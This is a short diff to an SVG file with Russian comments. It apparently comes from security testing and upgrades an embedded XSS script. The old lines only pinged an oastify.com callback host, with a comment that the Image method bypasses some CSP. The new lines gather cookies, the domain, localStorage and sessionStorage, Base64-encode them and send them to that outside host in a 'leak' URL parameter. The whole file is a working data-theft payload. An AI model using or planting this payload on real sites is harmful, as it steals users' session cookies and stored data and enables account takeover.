@@ -1,10 +1,16 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    // Попытка 1: Fetch API (современный метод)
-    fetch('https://ynp430s99pfg88kon73b9vbrsiybm1aq.oastify.com');
+    // 1. Собираем данные
+    var domain = document.domain; // Где мы находимся?
+    var cookie = document.cookie; // Есть ли куки?
+    var local = JSON.stringify(localStorage); // Весь LocalStorage
+    var session = JSON.stringify(sessionStorage); // Весь SessionStorage
+    
+    // 2. Формируем строку для отправки (Base64 чтобы не сломать URL)
+    var data = btoa("DOMAIN: " + domain + " | LS: " + local + " | COOKIE: " + cookie);
 
-    // Попытка 2: Загрузка картинки (старый надежный метод, обходит некоторые CSP)
+    // 3. Отправляем (используем Image для надежности)
     var i = new Image();
-    i.src = 'https://ynp430s99pfg88kon73b9vbrsiybm1aq.oastify.com?xss=svg_triggered';
+    i.src = 'https://ynp430s99pfg88kon73b9vbrsiybm1aq.oastify.com/?leak=' + data;
   </script>
 </svg>
